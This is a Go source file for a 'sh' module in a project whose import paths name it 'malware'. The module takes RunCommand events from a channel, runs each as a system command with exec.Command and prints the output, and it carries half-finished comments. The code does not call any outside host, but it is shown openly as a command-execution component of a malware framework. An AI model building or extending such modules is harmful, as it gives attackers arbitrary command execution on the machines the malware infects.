package sh

import (
	"fmt"
	"malware/common"
	"malware/types"
	"os/exec"
)

// Message to be sent by
type runCommand struct {
	command string
	args    []string
}

// RunCommand generates a RunCommand Message to our of
func RunCommand(args []string) types.Event {
	return runCommand{args[0], args[1:]}
}

type state struct {
	running      bool
	eventChannel chan types.Event
}

type settings struct {
	//shell string // Could be another struct referencing a connection_type, encryption methods, etc
	state *state // Tell our loop to stop
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{running: false, eventChannel: nil}
	return settings{&state}
}

func runEvents(settings settings) {
	for settings.state.running {
		message := <-settings.state.eventChannel

		switch cmd := message.(type) {
		case runCommand:
			out, err := exec.Command(cmd.command, cmd.args...).Output()
			if err != nil {
				common.Panicf(err, "Error on running command: %s", message)
			}

			fmt.Println(string(out))
		default:
			common.Panicf(nil, "Didn't receive RunCommand type, %s is type %T", message, message)
		}

		// DEBUG
		settings.state.eventChannel <- ""
	}
}

func (settings settings) Init() chan types.Event { // Init the state of this module
	settings.state.running = true
	settings.state.eventChannel = make(chan types.Event)

	go runEvents(settings)
	return settings.state.eventChannel
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "adam" }
